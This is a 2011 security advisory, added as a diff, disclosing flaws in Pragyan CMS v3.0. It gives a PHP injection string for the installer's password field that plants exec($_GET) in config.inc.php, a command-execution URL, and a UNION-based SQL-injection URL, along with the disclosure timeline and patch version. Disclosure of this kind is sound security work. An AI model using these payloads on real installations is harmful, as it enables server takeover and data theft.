@@ -1,0 +1,48 @@
+#Pragyan CMS v 3.0 mutiple Vulnerabilities
+#Author Villy and Abhishek Lyall - villys777[at]gmail[dot]com,
+abhilyall[at]gmail[dot]com
+#Web - http://www.aslitsecurity.com/
+#Blog - http://bugix-security.blogspot.com
+#http://www.aslitsecurity.blogspot.com/
+#Pragyan CMS v 3.0
+
+Technical Description
+
+
+1) Code execution in INSTALL/install.php
+script not correctly validate entered fields.
+possibility to write at password field string:
+
+");echo exec($_GET["a"]);echo ("
+
+or in another fields with turned of javascript.
+in cms/config.inc.php will be code:
+define("MYSQL_PASSWORD","");echo exec($_GET["a"]);echo ("");
+which allows command execution.
+
+EXPLOIT:: http://target.com/blog/cms/config.inc.php?a=ls -la
+
+2) sql injection
+- get mysql version EXPLOIT::
+http://target.com/path/+view&thread_id=-1 UNION ALL SELECT
+null,null,null,null,concat(unhex(Hex(cast(@@version as
+char)))),null,null,null--
+
+Solution
+update to Pragyan CMS 3.0 rev.274
+
+Changelog
+2011-19-02 : Initial release
+2011-20-02 : Reported to vendor
+2011-25-02 : patch released
+2011-25-02 : public disclose
+
+Credits
+Villy
+Abhishek Lyall
+pragyan.org
+http://bugix-security.blogspot.com
+http://www.aslitsecurity.blogspot.com/
+
+
+Abhishek Lyall
